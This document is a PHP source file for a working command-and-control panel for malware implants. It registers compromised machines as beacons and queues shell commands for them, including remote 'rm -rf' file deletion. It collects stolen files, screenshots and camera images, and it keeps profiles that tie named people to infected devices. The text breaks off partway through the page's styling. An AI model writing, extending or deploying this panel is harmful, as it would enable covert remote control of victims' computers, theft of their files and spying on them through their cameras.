<?php
session_start();
// ── Load .env ──
$ENV=[];
$envFile=__DIR__.'/.env';
if(is_file($envFile)){
    foreach(file($envFile,FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES)as$line){
        $line=trim($line);if(str_starts_with($line,'#'))continue;
        if(str_contains($line,'=')){$p=strpos($line,'=');$k=trim(substr($line,0,$p));$v=trim(substr($line,$p+1));$ENV[$k]=$v;}
    }
}
$AUTH_USER=$ENV['PANEL_USERNAME']??'admin';
$AUTH_PASS=$ENV['PANEL_PASSWORD']??'admin';

// ── Auth check ──
function requireAuth(){
    global $AUTH_USER,$AUTH_PASS;
    if(empty($_SESSION['panel_logged_in'])){
        if($_SERVER['REQUEST_METHOD']==='POST'&&($_REQUEST['action']??'')==='login'){
            $i=json_decode(file_get_contents('php://input'),1)??[];
            if(($i['username']??'')===$AUTH_USER&&($i['password']??'')===$AUTH_PASS){
                $_SESSION['panel_logged_in']=true;$_SESSION['panel_user']=$AUTH_USER;
                http_response_code(200);header('Content-Type: application/json');echo json_encode(['status'=>'ok']);exit;
            }
            http_response_code(401);header('Content-Type: application/json');echo json_encode(['error'=>'Invalid credentials']);exit;
        }
        if($_REQUEST['action']??''==='logout'){session_destroy();header('Location: ?');exit;}
        renderLogin();exit;
    }
}
function renderLogin(){?>
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>C2 Panel - Login</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:system-ui,-apple-system,sans-serif;background:#080c14;color:#c8d0dc;height:100vh;display:flex;align-items:center;justify-content:center}
.lg{background:#0f1620;border:1px solid #1e2a3a;border-radius:10px;padding:30px;width:320px}
.lg h1{font-size:16px;text-align:center;margin-bottom:20px;letter-spacing:1px}
.lg h1 span{color:#00c853}
.lg label{display:block;font-size:11px;color:#6b7f99;margin:10px 0 4px}
.lg input{width:100%;padding:8px 10px;background:#161f2e;border:1px solid #1e2a3a;border-radius:5px;color:#c8d0dc;font-size:13px;outline:none}
.lg input:focus{border-color:#00c853}
.lg button{width:100%;margin-top:18px;padding:8px;background:#00c853;border:none;border-radius:5px;color:#000;font-size:13px;font-weight:700;cursor:pointer}
.lg button:hover{background:#00e060}
.lg .er{color:#ff1744;font-size:11px;text-align:center;margin-top:10px;display:none}
</style></head><body>
<div class="lg"><h1>&#9670; C2 <span>Panel</span></h1>
<form onsubmit="event.preventDefault();login()">
<label>Username</label><input id="lu" value="<?=htmlspecialchars($GLOBALS['AUTH_USER'])?>" autocomplete="username">
<label>Password</label><input id="lp" type="password" placeholder="password" autocomplete="current-password">
<button type="submit">Sign In</button>
<div class="er" id="ler">Invalid credentials</div>
</form></div>
<script>async function login(){
const r=await fetch('?action=login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:document.getElementById('lu').value,password:document.getElementById('lp').value})});
if(r.ok){window.location.reload()}else{document.getElementById('ler').style.display='block'}
}</script>
</body></html>
<?php exit;}

define('STORAGE_DIR',__DIR__.'/data');define('UPLOAD_DIR',__DIR__.'/uploads');define('MEDIA_DIR',__DIR__.'/media');define('DEVICE_DIR',__DIR__.'/devices');define('HUMAN_DIR',__DIR__.'/humans');
foreach([STORAGE_DIR,UPLOAD_DIR,MEDIA_DIR,DEVICE_DIR,HUMAN_DIR]as$d)is_dir($d)or mkdir($d,0755,true);
function devicePath($u){return DEVICE_DIR.'/'.preg_replace('/[^a-zA-Z0-9-]/','',$u);}
function ensureDeviceDir($u){$d=devicePath($u);foreach(['','/files','/media']as$s){$p=$d.$s;is_dir($p)or mkdir($p,0755,true);}}
function humanPath($id){return HUMAN_DIR.'/'.preg_replace('/[^a-zA-Z0-9_]/','',$id);}
function ensureHumanDir($id){$d=humanPath($id);is_dir($d)or mkdir($d,0755,true);}
class DB{
static$i=null;static function i(){return self::$i??=new self;}
function f($n){$p=STORAGE_DIR."/$n.json";is_file($p)or file_put_contents($p,'[]');return$p;}
function r($n){return json_decode(file_get_contents($this->f($n)),1)??[];}
function w($n,$d){file_put_contents($this->f($n),json_encode($d,JSON_PRETTY_PRINT));}
function id($n){$m=0;foreach($this->r($n)as$i)if(($i['id']??0)>$m)$m=$i['id'];return$m+1;}
function nw(){return date('Y-m-d H:i:s');}
function beaconUp($u,$d){$a=$this->r('beacons');$n=$this->nw();foreach($a as&$b){
if($b['uuid']===$u){
$gap=strtotime($n)-(strtotime($b['last_seen']??'0')?:0);$dc=$gap>120?($b['last_seen']??null):($b['disconnected_at']??null);
$b=array_merge($b,$d,['last_seen'=>$n,'status'=>'active','disconnected_at'=>$dc]);$this->w('beacons',$a);return;}}
$a[]=array_merge(['uuid'=>$u,'nickname'=>'','disconnected_at'=>null],$d,['last_seen'=>$n,'first_seen'=>$n,'status'=>'active']);$this->w('beacons',$a);}
function beaconRename($u,$nick){$a=$this->r('beacons');foreach($a as&$b){if($b['uuid']===$u){$b['nickname']=$nick;$this->w('beacons',$a);return true;}}return false;}
function beaconSaveNotes($u,$text){$a=$this->r('beacons');foreach($a as&$b){if($b['uuid']===$u){$b['notes']=$text;$this->w('beacons',$a);return true;}}return false;}
function beacons(){return $this->r('beacons');}
function browseCacheSave($u,$p,$d){$a=$this->r('browse_cache');$n=$this->nw();$p=rtrim($p,'/')?:'/';foreach($a as&$e){if(($e['beacon_uuid']??'')===$u&&($e['path']??'')===$p){$e=array_merge($e,['entries'=>$d,'updated_at'=>$n]);$this->w('browse_cache',$a);return;}}$a[]=['beacon_uuid'=>$u,'path'=>$p,'entries'=>$d,'updated_at'=>$n];$this->w('browse_cache',$a);}
function browseCacheGet($u,$p){$a=$this->r('browse_cache');$p=rtrim($p,'/')?:'/';foreach($a as$e){if(($e['beacon_uuid']??'')===$u&&($e['path']??'')===$p)return$e;}return null;}
function taskC($u,$c){$a=$this->r('tasks');$i=$this->id('tasks');$a[]=['id'=>$i,'beacon_uuid'=>$u,'command'=>$c,'status'=>'pending','created_at'=>$this->nw(),'assigned_at'=>null,'completed_at'=>null];$this->w('tasks',$a);return$i;}
function taskP($u){$a=$this->r('tasks');$o=[];foreach($a as&$t){if($t['beacon_uuid']===$u&&$t['status']==='pending'){$t['status']='assigned';$t['assigned_at']=$this->nw();$o[]=['id'=>$t['id'],'command'=>$t['command']];}}$this->w('tasks',$a);return$o;}
function tasks($u=null,$s=null){$a=$this->r('tasks');if($u)$a=array_values(array_filter($a,fn($t)=>$t['beacon_uuid']===$u));if($s)$a=array_values(array_filter($a,fn($t)=>$t['status']===$s));usort($a,fn($x,$y)=>strcmp($y['created_at']??'',$x['created_at']??''));return$a;}
function resultC($tid,$u,$o,$s){$a=$this->r('results');$i=$this->id('results');$a[]=['id'=>$i,'task_id'=>(int)$tid,'beacon_uuid'=>$u,'output'=>$o,'status'=>$s,'created_at'=>$this->nw()];$this->w('results',$a);$t=$this->r('tasks');foreach($t as&$x){if($x['id']===(int)$tid){$x['status']='completed';$x['completed_at']=$this->nw();break;}}$this->w('tasks',$t);return$i;}
function results($tid=null,$u=null){$a=$this->r('results');if($tid)$a=array_values(array_filter($a,fn($r)=>$r['task_id']===(int)$tid));if($u)$a=array_values(array_filter($a,fn($r)=>$r['beacon_uuid']===$u));usort($a,fn($x,$y)=>strcmp($y['created_at']??'',$x['created_at']??''));return$a;}
function fileC($u,$n,$p,$s){$a=$this->r('files');$i=$this->id('files');$a[]=['id'=>$i,'beacon_uuid'=>$u,'filename'=>$n,'path'=>$p,'size'=>(int)$s,'created_at'=>$this->nw()];$this->w('files',$a);return$i;}
function files($u=null){$a=$this->r('files');if($u)$a=array_values(array_filter($a,fn($f)=>$f['beacon_uuid']===$u));usort($a,fn($x,$y)=>strcmp($y['created_at']??'',$x['created_at']??''));return$a;}
function fileById($i){foreach($this->r('files')as$f)if(($f['id']??0)===(int)$i)return$f;return null;}
function mediaC($u,$t,$n,$p){$a=$this->r('media');$i=$this->id('media');$a[]=['id'=>$i,'beacon_uuid'=>$u,'type'=>$t,'filename'=>$n,'path'=>$p,'created_at'=>$this->nw()];$this->w('media',$a);return$i;}
function media($u=null){$a=$this->r('media');if($u)$a=array_values(array_filter($a,fn($m)=>$m['beacon_uuid']===$u));usort($a,fn($x,$y)=>strcmp($y['created_at']??'',$x['created_at']??''));return$a;}
function mediaById($i){foreach($this->r('media')as$m)if(($m['id']??0)===(int)$i)return$m;return null;}
}
function ji(){return json_decode(file_get_contents('php://input'),1)??[];}
function jo($d,$c=200){http_response_code($c);header('Content-Type: application/json');echo json_encode($d);exit;}
function je($m,$c=400){jo(['error'=>$m],$c);}
function nm($m){if($_SERVER['REQUEST_METHOD']!==$m)je('Method not allowed',405);}
$action=$_REQUEST['action']??'';
// Require auth for all actions except beacon comms and login/logout
$public=['beacon','result','login','logout'];
if($_SERVER['REQUEST_METHOD']==='POST'&&in_array($action,['file','media_upload']))$public[]=$action;
if(!in_array($action,$public))requireAuth();
switch($action){
case'beacon':nm('POST');$i=ji();if(empty($i['uuid']))je('Missing uuid');DB::i()->beaconUp($i['uuid'],['ip'=>$i['ip']??'','hostname'=>$i['hostname']??'','os'=>$i['os']??'','username'=>$i['username']??'','privilege'=>$i['privilege']??'user','pid'=>intval($i['pid']??0)]);jo(['tasks'=>DB::i()->taskP($i['uuid']),'sleep'=>rand(5,15)]);break;
case'task':if($_SERVER['REQUEST_METHOD']==='POST'){$i=ji();if(empty($i['beacon_uuid'])||empty($i['command']))je('Missing');$id=DB::i()->taskC($i['beacon_uuid'],$i['command']);jo(['id'=>$id,'status'=>'created'],201);}else jo(DB::i()->tasks($_GET['beacon_uuid']??null,$_GET['status']??null));break;
case'result':if($_SERVER['REQUEST_METHOD']==='POST'){$i=ji();if(empty($i['task_id'])||empty($i['beacon_uuid']))je('Missing');$tid=intval($i['task_id']);$u=$i['beacon_uuid'];$ot=$i['output']??'';DB::i()->resultC($tid,$u,$ot,$i['status']??'completed');
    // Auto-cache browse + log commands + persist info
    $ts=DB::i()->tasks();$cmd='';foreach($ts as$t){if(($t['id']??0)===$tid){$cmd=$t['command']??'';break;}}
    if($cmd){
        if(str_starts_with($cmd,'browse ')){$p=trim(substr($cmd,7));$j=json_decode($ot,1);if($j&&isset($j['files']))DB::i()->browseCacheSave($u,$p,$j['files']);}
        ensureDeviceDir($u);$dp=devicePath($u);
        // Log to commands.json
        $clog=$dp.'/commands.json';$cx=is_file($clog)?json_decode(file_get_contents($clog),1):[];$cx[]=['command'=>$cmd,'output'=>substr($ot,0,4096),'timestamp'=>DB::i()->nw()];$cx=array_slice($cx,-500);file_put_contents($clog,json_encode($cx,JSON_PRETTY_PRINT));
        // Save sysinfo/whoami to info.json
        if(str_starts_with($cmd,'sysinfo')||str_starts_with($cmd,'whoami')){$ij=json_decode($ot,1);if($ij||str_starts_with($cmd,'whoami')){$inf=is_file($dp.'/info.json')?json_decode(file_get_contents($dp.'/info.json'),1):[];$inf['collected_at']=DB::i()->nw();if(str_starts_with($cmd,'sysinfo')&&$ij){foreach(['hostname','os','username','ip','privilege','pid','arch','cwd']as$k){if(isset($ij[$k]))$inf[$k]=$ij[$k];}}elseif(str_starts_with($cmd,'whoami')){$inf['username']=$ot;}file_put_contents($dp.'/info.json',json_encode($inf,JSON_PRETTY_PRINT));}}
        // Log terminal output
        $tlog=$dp.'/terminal.json';$tx=is_file($tlog)?json_decode(file_get_contents($tlog),1):[];$tx[]=['command'=>$cmd,'output'=>$ot,'timestamp'=>DB::i()->nw()];$tx=array_slice($tx,-500);file_put_contents($tlog,json_encode($tx,JSON_PRETTY_PRINT));
    }
    jo(['status'=>'received']);}else{$tid=isset($_GET['task_id'])?intval($_GET['task_id']):null;jo(DB::i()->results($tid,$_GET['beacon_uuid']??null));}break;
case'file':if($_SERVER['REQUEST_METHOD']==='POST'){if(isset($_FILES['file'])){$u=$_POST['beacon_uuid']??'';if(!$u)je('Missing');if($_FILES['file']['error']!==UPLOAD_ERR_OK)je('Upload failed',500);$f=$_FILES['file'];$n=preg_replace('/^.*[\\\\\\/]/','',basename($f['name']));ensureDeviceDir($u);$dp=devicePath($u).'/files/'.time().'_'.$n;move_uploaded_file($f['tmp_name'],$dp);$id=DB::i()->fileC($u,$n,$dp,$f['size']);jo(['id'=>$id,'filename'=>$n,'size'=>$f['size'],'status'=>'uploaded'],201);}else{$i=ji();if(empty($i['beacon_uuid'])||empty($i['filename'])||empty($i['data']))je('Missing');$n=preg_replace('/^.*[\\\\\\/]/','',basename($i['filename']));$u=$i['beacon_uuid'];ensureDeviceDir($u);$dp=devicePath($u).'/files/'.time().'_'.$n;$raw=base64_decode($i['data']);file_put_contents($dp,$raw);$id=DB::i()->fileC($u,$n,$dp,strlen($raw));jo(['id'=>$id,'status'=>'uploaded'],201);}}elseif($_SERVER['REQUEST_METHOD']==='GET'){$id=$_GET['id']??0;if($id){$f=DB::i()->fileById((int)$id);if(!$f)je('Not found',404);header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.$f['filename'].'"');header('Content-Length: '.$f['size']);readfile($f['path']);exit;}jo(DB::i()->files($_GET['beacon_uuid']??null));}else je('405',405);break;
case'media_upload':nm('POST');$i=ji();if(empty($i['beacon_uuid'])||empty($i['data'])||empty($i['type']))je('Missing');$ext=['screenshot'=>'png','camera'=>'jpg'];$e=$ext[$i['type']]??'bin';$n=$i['type'].'_'.time().'.'.$e;$u=$i['beacon_uuid'];ensureDeviceDir($u);$p=devicePath($u).'/media/'.$n;$raw=base64_decode($i['data']);file_put_contents($p,$raw);$id=DB::i()->mediaC($u,$i['type'],$n,$p);jo(['id'=>$id,'status'=>'uploaded'],201);break;
case'media':$id=$_GET['id']??0;if($id){$m=DB::i()->mediaById((int)$id);if(!$m)je('NotFound',404);$ext=strtolower(pathinfo($m['filename'],PATHINFO_EXTENSION));$mt=['jpg'=>'image/jpeg','jpeg'=>'image/jpeg','png'=>'image/png','gif'=>'image/gif','webp'=>'image/webp'];header('Content-Type: '.($mt[$ext]??'application/octet-stream'));readfile($m['path']);exit;}jo(DB::i()->media($_GET['beacon_uuid']??null));break;
case'rename':nm('POST');$i=ji();if(empty($i['uuid'])||!isset($i['nickname']))je('Missing');DB::i()->beaconRename($i['uuid'],$i['nickname']);jo(['status'=>'ok']);break;
case'savenotes':nm('POST');$i=ji();if(empty($i['uuid'])||!isset($i['text']))je('Missing');DB::i()->beaconSaveNotes($i['uuid'],$i['text']);ensureDeviceDir($i['uuid']);file_put_contents(devicePath($i['uuid']).'/notes.txt',$i['text']);jo(['status'=>'ok']);break;
case'beacons':jo(DB::i()->beacons());break;
case'tasks':jo(DB::i()->tasks($_GET['beacon_uuid']??null,$_GET['status']??null));break;
case'results':$tid=isset($_GET['task_id'])?intval($_GET['task_id']):null;jo(DB::i()->results($tid,$_GET['beacon_uuid']??null));break;
case'files':jo(DB::i()->files($_GET['beacon_uuid']??null));break;
case'browse_cache':
    if($_SERVER['REQUEST_METHOD']==='GET'){
        $u=$_GET['beacon_uuid']??'';$p=$_GET['path']??'/';
        if(!$u)je('Missing beacon_uuid');
        $r=DB::i()->browseCacheGet($u,$p);
        jo($r?:['entries'=>null]);
    }else{$i=ji();if(empty($i['beacon_uuid'])||!isset($i['path'])||!isset($i['entries']))je('Missing');DB::i()->browseCacheSave($i['beacon_uuid'],$i['path'],$i['entries']);jo(['status'=>'ok']);}
    break;
case'file_delete':nm('POST');$i=ji();if(empty($i['beacon_uuid'])||empty($i['path']))je('Missing');$tid=DB::i()->taskC($i['beacon_uuid'],'shell rm -rf '.escapeshellarg($i['path']));jo(['task_id'=>$tid,'status'=>'created']);break;
case'browse_req':nm('POST');$i=ji();if(empty($i['beacon_uuid'])||!isset($i['path']))je('Missing');$tid=DB::i()->taskC($i['beacon_uuid'],'browse '.$i['path']);jo(['task_id'=>$tid,'status'=>'created']);break;
case'ls_device':nm('GET');$u=$_GET['beacon_uuid']??'';if(!$u)je('Missing');$dp=devicePath($u);if(!is_dir($dp))jo(['entries'=>[]]);$o=[];$items=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dp,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);foreach($items as$item){$rp=str_replace($dp.'/','',$item->getPathname());$o[]=['path'=>$rp,'name'=>$item->getFilename(),'type'=>$item->isDir()?'dir':'file','size'=>$item->isFile()?$item->getSize():0,'modified'=>date('Y-m-d H:i:s',$item->getMTime())];}jo(['entries'=>$o]);break;
case'device_read':nm('GET');$u=$_GET['beacon_uuid']??'';$p=$_GET['path']??'';if(!$u||!$p)je('Missing');$fp=devicePath($u).'/'.$p;$fp=str_replace('..','',$fp);if(!is_file($fp))je('Not found',404);$ext=strtolower(pathinfo($fp,PATHINFO_EXTENSION));$mime=['jpg'=>'image/jpeg','jpeg'=>'image/jpeg','png'=>'image/png','gif'=>'image/gif','webp'=>'image/webp','mp4'=>'video/mp4','webm'=>'video/webm','pdf'=>'application/pdf'];if(isset($mime[$ext])){header('Content-Type: '.$mime[$ext]);readfile($fp);exit;}header('Content-Type: text/plain; charset=utf-8');header('Content-Disposition: inline');readfile($fp);exit;break;
case'device_info':nm('GET');$u=$_GET['beacon_uuid']??'';if(!$u)je('Missing');$fp=devicePath($u).'/info.json';if(!is_file($fp))jo(['error'=>'no info yet']);jo(json_decode(file_get_contents($fp),1));break;
case'terminal':nm('GET');$u=$_GET['beacon_uuid']??'';if(!$u)je('Missing');$fp=devicePath($u).'/terminal.json';if(!is_file($fp))jo([]);jo(json_decode(file_get_contents($fp),1));break;
case'remove_device':nm('POST');$i=ji();$u=$i['uuid']??'';if(!$u)je('Missing');
    $db=DB::i();
    // Remove from beacons
    $beacons=$db->r('beacons');
    $beacons=array_values(array_filter($beacons,fn($b)=>$b['uuid']!==$u));
    $db->w('beacons',$beacons);
    // Remove related tasks
    $tasks=$db->r('tasks');
    $tasks=array_values(array_filter($tasks,fn($t)=>($t['beacon_uuid']??'')!==$u));
    $db->w('tasks',$tasks);
    // Remove related results
    $results=$db->r('results');
    $results=array_values(array_filter($results,fn($r)=>($r['beacon_uuid']??'')!==$u));
    $db->w('results',$results);
    // Remove related files
    $files=$db->r('files');
    $files=array_values(array_filter($files,fn($f)=>($f['beacon_uuid']??'')!==$u));
    $db->w('files',$files);
    // Remove related media
    $media=$db->r('media');
    $media=array_values(array_filter($media,fn($m)=>($m['beacon_uuid']??'')!==$u));
    $db->w('media',$media);
    // Remove browse cache
    $cache=$db->r('browse_cache');
    $cache=array_values(array_filter($cache,fn($c)=>($c['beacon_uuid']??'')!==$u));
    $db->w('browse_cache',$cache);
    // Remove person links
    $persons=$db->r('persons');
    foreach($persons as&$p){$devs=$p['linked_devices']??[];$devs=array_values(array_filter($devs,fn($d)=>$d!==$u));$p['linked_devices']=$devs;}
    $db->w('persons',$persons);
    // Delete device folder
    $dp=devicePath($u);
    if(is_dir($dp)){
        $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dp,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST);
        foreach($it as$f){is_dir($f)?rmdir($f):unlink($f);}
        rmdir($dp);
    }
    jo(['status'=>'ok']);
    break;
case'persons':
    if($_SERVER['REQUEST_METHOD']==='GET'){jo(DB::i()->r('persons'));}
    else{$i=ji();if(empty($i['name']))je('Missing name');$ps=DB::i()->r('persons');$id='p_'.uniqid();ensureHumanDir($id);$ps[]=['id'=>$id,'name'=>$i['name'],'photo'=>$i['photo']??'','info'=>$i['info']??'','notes'=>$i['notes']??'','social'=>$i['social']??[],'linked_devices'=>[],'created_at'=>DB::i()->nw(),'updated_at'=>DB::i()->nw()];DB::i()->w('persons',$ps);file_put_contents(humanPath($id).'/notes.txt',$i['notes']??'');file_put_contents(humanPath($id).'/info.txt',$i['info']??'');jo(['id'=>$id,'status'=>'created'],201);}
    break;
case'person':
    if($_SERVER['REQUEST_METHOD']==='POST'){$i=ji();if(empty($i['id']))je('Missing id');$ps=DB::i()->r('persons');foreach($ps as&$p){if($p['id']===$i['id']){foreach(['name','photo','info','notes','social']as$k){if(isset($i[$k]))$p[$k]=$i[$k];}$p['updated_at']=DB::i()->nw();if(isset($i['linked_devices']))$p['linked_devices']=$i['linked_devices'];DB::i()->w('persons',$ps);ensureHumanDir($p['id']);file_put_contents(humanPath($p['id']).'/notes.txt',$p['notes']??'');file_put_contents(humanPath($p['id']).'/info.txt',$p['info']??'');file_put_contents(humanPath($p['id']).'/social.json',json_encode($p['social']??[],JSON_PRETTY_PRINT));jo(['status'=>'ok']);return;}}je('Not found',404);}
    else{$id=$_GET['id']??'';if(!$id)je('Missing id');$ps=DB::i()->r('persons');foreach($ps as$p){if($p['id']===$id)jo($p);}je('Not found',404);}
    break;
case'person_delete':nm('POST');$i=ji();$id=$i['id']??'';if(!$id)je('Missing');$ps=DB::i()->r('persons');$ps=array_values(array_filter($ps,fn($p)=>$p['id']!==$id));DB::i()->w('persons',$ps);
    $hp=humanPath($id);if(is_dir($hp)){$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($hp,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST);foreach($it as$f){is_dir($f)?rmdir($f):unlink($f);}rmdir($hp);}
    jo(['status'=>'ok']);break;
case'person_link':nm('POST');$i=ji();$pid=$i['person_id']??'';$bid=$i['beacon_uuid']??'';$un=$i['unlink']??false;if(!$pid||!$bid)je('Missing');$ps=DB::i()->r('persons');foreach($ps as&$p){if($p['id']===$pid){$devs=$p['linked_devices']??[];if($un){$devs=array_values(array_filter($devs,fn($d)=>$d!==$bid));}else{if(!in_array($bid,$devs))$devs[]=$bid;}$p['linked_devices']=$devs;$p['updated_at']=DB::i()->nw();DB::i()->w('persons',$ps);jo(['status'=>'ok']);return;}}je('Person not found',404);break;
case'person_photo':nm('POST');$i=ji();$id=$i['id']??'';$data=$i['data']??'';if(!$id||!$data)je('Missing');$ps=DB::i()->r('persons');foreach($ps as&$p){if($p['id']===$id){$pd=DEVICE_DIR.'/_persons';is_dir($pd)or mkdir($pd,0755,true);$fp=$pd.'/'.$id.'.jpg';$raw=base64_decode($data);file_put_contents($fp,$raw);$p['photo']='persons/'.$id.'.jpg';$p['updated_at']=DB::i()->nw();DB::i()->w('persons',$ps);jo(['status'=>'ok']);return;}}je('Not found',404);break;
case'person_photo_get':nm('GET');$id=$_GET['id']??'';if(!$id)je('Missing');$fp=DEVICE_DIR.'/_persons/'.$id.'.jpg';if(!is_file($fp))je('Not found',404);header('Content-Type: image/jpeg');readfile($fp);exit;break;
case'human_files':nm('GET');$id=$_GET['id']??'';if(!$id)je('Missing');$hp=humanPath($id);if(!is_dir($hp))jo(['entries'=>[]]);$o=[];$items=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($hp,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);foreach($items as$item){$rp=str_replace($hp.'/','',$item->getPathname());$o[]=['path'=>$rp,'name'=>$item->getFilename(),'type'=>$item->isDir()?'dir':'file','size'=>$item->isFile()?$item->getSize():0,'modified'=>date('Y-m-d H:i:s',$item->getMTime())];}jo(['entries'=>$o]);break;
case'human_file_read':nm('GET');$id=$_GET['id']??'';$fn=$_GET['file']??'';if(!$id||!$fn)je('Missing');$fp=humanPath($id).'/'.basename($fn);$fp=str_replace('..','',$fp);if(!is_file($fp))je('Not found',404);header('Content-Type: text/plain; charset=utf-8');readfile($fp);exit;break;
default:render();}
function render(){$db=DB::i();$beacons=$db->beacons();$total=count($beacons);$active=count(array_filter($beacons,fn($b)=>($b['status']??'')==='active'));
$tasks=$db->tasks();$pending=count(array_filter($tasks,fn($t)=>($t['status']??'')==='pending'));$done=count(array_filter($tasks,fn($t)=>($t['status']??'')==='completed'));
$media=$db->media();$files=$db->files();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>C2 Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#080c14;--surface:#0f1620;--surface2:#161f2e;--border:#1e2a3a;--text:#c8d0dc;--text2:#6b7f99;--green:#00c853;--blue:#2979ff;--red:#ff1744;--amber:#ffab00;--purple:#7c4dff;--cyan:#00e5ff}
body{font-family:system-ui,-apple-system,'Segoe UI',sans-serif;background:var(--bg);color:var(--text);height:100vh;display:flex;flex-direction:column}
.top{display:flex;align-items:center;justify-content:space-between;padding:7px 18px;background:var(--surface);border-bottom:1px solid var(--border);flex-shrink:0}
.top h1{font-size:14px;letter-spacing:1px;white-space:nowrap}
.top h1 span{color:var(--green)}
.top .st{font-size:10px;color:var(--text2);display:flex;gap:12px}
.top .st b.g{color:var(--green)}.top .st b.r{color:var(--red)}
.hf{display:flex;flex:1;overflow:hidden}
.sb{width:270px;background:var(--surface);border-right:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0}
.sb .sh{padding:8px 12px;font-size:10px;color:var(--text2);text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid var(--border);flex-shrink:0}
.sb .sh input{background:var(--surface2);border:1px solid var(--border);border-radius:4px;padding:5px 8px;color:var(--text);font-size:11px;width:100%;margin-top:5px;outline:none}
.sb .sh input:focus{border-color:var(--green)}
.sb .grp{flex-shrink:0}
.sb .grp .gl{font-size:10px;color:var(--text2);padding:6px 12px 2px;text-transform:uppercase;letter-spacing:.5px;display:flex;justify-content:space-between}
.sb .grp .gl .ct{color:var(--text2);font-weight:400}
.sb .items{overflow-y:auto}
.bit{padding:7px 12px;border-bottom:1px solid #0f1620;cursor:pointer;display:flex;align-items:center;gap:8px;transition:.1s}
.bit:hover{background:var(--surface2)}
.bit.sel{background:#00c85310;border-left:3px solid var(--green)}
.bit .dd{width:6px;height:6px;border-radius:50%;flex-shrink:0}
.bit .bi{flex:1;min-width:0}
.bit .bi .nm{font-size:12px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.bit .bi .nm .nick{color:var(--green)}.bit .bi .nm .un{color:var(--text)}.bit .bi .sb2{font-size:10px;color:var(--text2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.bit .ts{font-size:9px;color:var(--text2);white-space:nowrap}
.bit .sg{display:inline-block;padding:0 5px;border-radius:2px;font-size:9px;font-weight:600}
.bit .sg-g{background:#00c85320;color:var(--green)}.bit .sg-r{background:#ff174420;color:var(--red)}
.rt{flex:1;display:flex;flex-direction:column;overflow:hidden}
.wc{display:flex;flex:1;align-items:center;justify-content:center;color:var(--text2);font-size:13px;flex-direction:column;gap:8px}
.wc .bg{font-size:40px;color:var(--border)}
.pn{flex:1;overflow-y:auto;padding:12px 16px;display:none;flex-direction:column}
.pn.on{display:flex}
.rw{display:flex;gap:12px;margin-bottom:12px;flex-wrap:wrap}
.cl{flex:1;min-width:260px}
.cd{background:var(--surface);border:1px solid var(--border);border-radius:8px}
.cd .ch{padding:8px 12px;background:var(--surface2);font-size:11px;font-weight:600;color:var(--text2);border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center}
.cd .cb{padding:10px 12px}
.ig{display:grid;grid-template-columns:auto 1fr;gap:2px 12px;font-size:12px}
.ig .l{color:var(--text2);white-space:nowrap}
.ig .v{overflow:hidden;text-overflow:ellipsis}
.tt{font-family:monospace;font-size:11px;color:var(--cyan);word-break:break-all}
.tg{display:inline-block;padding:1px 6px;border-radius:3px;font-size:10px;font-weight:600}
.tg-g{background:#00c85320;color:var(--green);border:1px solid #00c85340}
.tg-r{background:#ff174420;color:var(--red);border:1px solid #ff174440}
.tg-a{background:#ffab0020;color:var(--amber);border:1px solid #ffab0040}
.tg-b{background:#2979ff20;color:var(--blue);border:1px solid #2979ff40}
.tc{width:380px;background:var(--surface);border-left:1px solid var(--border);display:none;flex-direction:column;flex-shrink:0}
.tc.on{display:flex}
.tc .th{padding:7px 10px;font-size:10px;color:var(--text2);text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid var(--border);flex-shrink:0;display:flex;justify-content:space-between}
.tc .th .th-n{color:var(--green);font-weight:600}
.tc .to{flex:1;overflow-y:auto;padding:8px;background:#0a0a0a;font-family:'Consolas','Courier New',monospace;font-size:12px;line-height:1.5;min-height:0}
.tc .to .l{white-space:pre-wrap;word-break:break-all}
.tc .to .l.g{color:var(--green)}
.tc .to .l.w{color:var(--text)}
.tc .to .l.r{color:var(--red)}
.tc .to .l.s{color:var(--text2);font-style:italic}
.ti{display:flex;gap:5px;padding:7px 8px;flex-shrink:0;background:var(--surface);border-top:1px solid var(--border)}
.ti input{flex:1;background:#0a0a0a;border:1px solid var(--border);border-radius:3px;padding:6px 9px;color:var(--green);font-family:monospace;font-size:12px;outline:none}
.ti input:focus{border-color:var(--green)}
.nt{width:100%;min-height:60px;background:var(--surface2);border:1px solid var(--border);border-radius:4px;padding:6px 8px;color:var(--text);font-family:inherit;font-size:11px;resize:vertical;outline:none}
.nt:focus{border-color:var(--green)}
.nt-ct{display:flex;gap:4px;margin-top:4px}
#fm-card{display:none}
#fm-card.fm-on{display:block}
#df-card{display:none}
#df-card.df-on{display:block}
.fm-pb{display:flex;align-items:center;gap:4px;padding:4px 0;flex-wrap:wrap}
.fm-pb .pth{font-family:monospace;font-size:11px;color:var(--cyan);padding:2px 6px;background:var(--surface2);border-radius:3px;cursor:pointer}
.fm-pb .pth:hover{background:var(--border);color:var(--text)}
.fm-pb .pth-cur{color:var(--green);background:var(--surface)}
.fm-pb input{flex:1;min-width:80px;font-family:monospace;font-size:11px}
.fm-t{width:100%;border-collapse:collapse;font-size:11px}
.fm-t th{padding:4px 6px;text-align:left;color:var(--text2);font-weight:600;border-bottom:1px solid var(--border);font-size:10px;text-transform:uppercase}
